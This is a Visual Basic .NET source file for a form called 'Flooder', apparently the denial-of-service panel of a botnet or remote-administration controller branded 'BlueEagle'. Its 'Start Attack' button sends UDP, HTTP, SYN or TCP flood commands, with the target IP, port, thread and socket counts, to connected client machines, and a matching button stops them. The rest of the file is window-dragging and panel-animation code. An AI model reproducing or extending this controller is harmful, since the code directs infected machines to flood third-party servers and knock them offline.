Public Class Flooder
    Public sock As Integer
    Dim yy As String = Main.Yy
#Region "Drag"

    Dim posX As Integer
    Dim posY As Integer
    Dim drag As Boolean



    Private Sub Header_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label2.MouseDown
        If e.Button = MouseButtons.Left Then
            drag = True
            posX = Cursor.Position.X - Me.Left
            posY = Cursor.Position.Y - Me.Top
        End If
    End Sub

    Private Sub Header_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label2.MouseUp
        drag = False
    End Sub

    Private Sub Header_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label2.MouseMove
        If drag Then
            Me.Top = Cursor.Position.Y - posY
            Me.Left = Cursor.Position.X - posX
        End If
        Me.Cursor = Cursors.Default
    End Sub


    Private Sub buttonClos_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles buttonClos.Click

        Me.Close()
    End Sub



#End Region
    Dim Curr As Double = 0.0

    Private Sub Timer1_Tick(sender As System.Object, e As System.EventArgs) Handles Timer1.Tick
        If Curr < 382 Then '383

            Curr += 38.3
            Me.Size = New Size(Me.Width, Curr)
        Else
            Timer1.Stop()
            LoadManager()

            Exit Sub
        End If
    End Sub
    Private Sub LoadManager()
        Connection_Turn()
    End Sub

    Private Sub Flooder_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Me.AllowTransparency = True
        Me.TransparencyKey = Me.BackColor
        Timer1.Start()
    End Sub
    Dim PanelH As Double = 0.0
    Private Sub connectionManager_Tick(sender As System.Object, e As System.EventArgs) Handles connectionManager.Tick
        If PanelH < 278 Then '279
            PanelH += 27.9
            Panel1.Size = New Size(Panel1.Width, PanelH)
        Else
            connectionManager.Stop() '
            Exit Sub
        End If
    End Sub
    Private Sub Connection_Turn()
        connectionManager.Start()

    End Sub

    Private Sub Button8_Click(sender As System.Object, e As System.EventArgs) Handles Button8.Click
        Connection_Turn() '574; 391
    End Sub
#Region "Drag_Pointer"

    Dim PointposX As Integer
    Dim PointposY As Integer
    Dim Pointdrag As Boolean



    Private Sub PointEr_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles PointEr.MouseDown
        If e.Button = MouseButtons.Left Then
            Pointdrag = True
            PointposX = Cursor.Position.X - PointEr.Left
            PointposY = Cursor.Position.Y - PointEr.Top
        End If
    End Sub

    Private Sub PointEr_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles PointEr.MouseUp
        Pointdrag = False
    End Sub

    Private Sub PointEr_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles PointEr.MouseMove
        If Pointdrag Then
            ' PointEr.Top = Cursor.Position.Y - PointposY
            If PointEr.Location.X > 20 Or PointEr.Location.X > 50 Then
                PointEr.Left = 173
                Exit Sub
            End If
            If PointEr.Location.X > 173 Or PointEr.Location.X > 180 Then
                PointEr.Left = 296
                Exit Sub
            End If
            If PointEr.Location.X > 296 Or PointEr.Location.X > 350 Then
                PointEr.Left = 448
                Exit Sub
            End If
            PointEr.Left = Cursor.Position.X - PointposX
        End If
        Me.Cursor = Cursors.Default
    End Sub

 


#End Region

    Private Sub Label7_Click(sender As System.Object, e As System.EventArgs) Handles Label7.Click
        PointEr.Left = 18 'UDP
    End Sub

    Private Sub Label8_Click(sender As System.Object, e As System.EventArgs) Handles Label8.Click
        PointEr.Left = 173 'HTTP
    End Sub

    Private Sub Label9_Click(sender As System.Object, e As System.EventArgs) Handles Label9.Click
        PointEr.Left = 296 'SYN
    End Sub

    Private Sub Label21_Click(sender As System.Object, e As System.EventArgs) Handles Label21.Click
        PointEr.Left = 448 'TCP
    End Sub

    Private Sub Typer_Tick(sender As System.Object, e As System.EventArgs) Handles Typer.Tick
        If PanelH < 269 Then '279
            PanelH += 27.0
            Panel6.Size = New Size(Panel6.Width, PanelH)
        Else
            Typer.Stop() '
            Exit Sub
        End If
    End Sub

    Private Sub Button3_Click(sender As System.Object, e As System.EventArgs) Handles Button3.Click
        PanelH = 0.0
        Panel1.Visible = False
        Panel6.Location = New Point(Panel1.Location.X, Panel1.Location.Y)
        Typer.Start()
    End Sub

    Private Sub Button2_Click(sender As System.Object, e As System.EventArgs) Handles Button2.Click
        If Button2.Text = "Start Attack" Then
            Button2.Text = "Stop Attack"

            Select Case PointEr.Left
                Case 18
                    Try
                        Main.S.Send(sock, "Fstart|BlueEagle|UDP|BlueEagle|" & attip.Text & yy & attport.Text & yy & attthrd.Text & yy & attsock.Text)
                        attlog.Text += "[" & TimeOfDay & "]" & " UDP Flooding started." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    Catch ex As Exception
                        attlog.Text += "[" & TimeOfDay & "]" & " Command failed." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    End Try
                Case 173
                    Try
                        Main.S.Send(sock, "Fstart|BlueEagle|HTTP|BlueEagle|" & attip.Text & yy & atttime.Text & yy & attthrd.Text)
                        attlog.Text += "[" & TimeOfDay & "]" & " HTTP Flooding started." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    Catch ex As Exception
                        attlog.Text += "[" & TimeOfDay & "]" & " Command failed." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    End Try
                Case 296
                    Try
                        Main.S.Send(sock, "Fstart|BlueEagle|SYN|BlueEagle|" & attip.Text & yy + attport.Text & yy & attthrd.Text & yy & attsock.Text)
                        attlog.Text += "[" & TimeOfDay & "]" & " SYN Flooding started." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    Catch ex As Exception
                        attlog.Text += "[" & TimeOfDay & "]" & " Command failed." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    End Try
                Case 448
                    Try
                        Main.S.Send(sock, "Fstart|BlueEagle|TCP|BlueEagle|" & attip.Text & yy & attport.Text & yy & atttime.Text & yy & attthrd.Text)
                        attlog.Text += "[" & TimeOfDay & "]" & " TCP Flooding started." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    Catch ex As Exception
                        attlog.Text += "[" & TimeOfDay & "]" & " Command failed." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    End Try
            End Select
        Else
            Select Case PointEr.Left
                Case 18
                    Try
                        Main.S.Send(sock, "Fstop|BlueEagle|UDP|BlueEagle|" + attip.Text + " " + attport.Text + " " + attthrd.Text + " " + attsock.Text)
                        attlog.Text += "[" & TimeOfDay & "]" & " UDP Flooding stopped." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    Catch ex As Exception
                        attlog.Text += "[" & TimeOfDay & "]" & " Command failed." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    End Try
                Case 173
                    Try
                        Main.S.Send(sock, "Fstop|BlueEagle|HTTP")
                        attlog.Text += "[" & TimeOfDay & "]" & " HTTP Flooding stopped." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    Catch ex As Exception
                        attlog.Text += "[" & TimeOfDay & "]" & " Command failed." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    End Try
                Case 296
                    Try
                        Main.S.Send(sock, "Fstop|BlueEagle|SYN|BlueEagle|")
                        attlog.Text += "[" & TimeOfDay & "]" & " SYN Flooding stopped." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    Catch ex As Exception
                        attlog.Text += "[" & TimeOfDay & "]" & " Command failed." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    End Try
                Case 448
                    Try
                        Main.S.Send(sock, "Fstop|BlueEagle|TCP")
                        attlog.Text += "[" & TimeOfDay & "]" & " TCP Flooding stopped." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    Catch ex As Exception
                        attlog.Text += "[" & TimeOfDay & "]" & " Command failed." & vbNewLine
                        attlog.SelectionStart = attlog.TextLength
                        attlog.ScrollToCaret()
                    End Try
            End Select
            Button2.Text = "Start Attack"

        End If
    End Sub

    Private Sub Log_MAX_Tick(sender As System.Object, e As System.EventArgs) Handles Log_MAX.Tick
        If PanelH < 269 Then '279
            PanelH += 27.0
            Panel8.Size = New Size(Panel8.Width, PanelH)
        Else
            Log_MAX.Stop() '
            Exit Sub
        End If
    End Sub

    Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click
        PanelH = 0.0
        Panel6.Visible = False
        Panel8.Location = New Point(Panel6.Location.X, Panel6.Location.Y)
        Log_MAX.Start()
    End Sub
End Class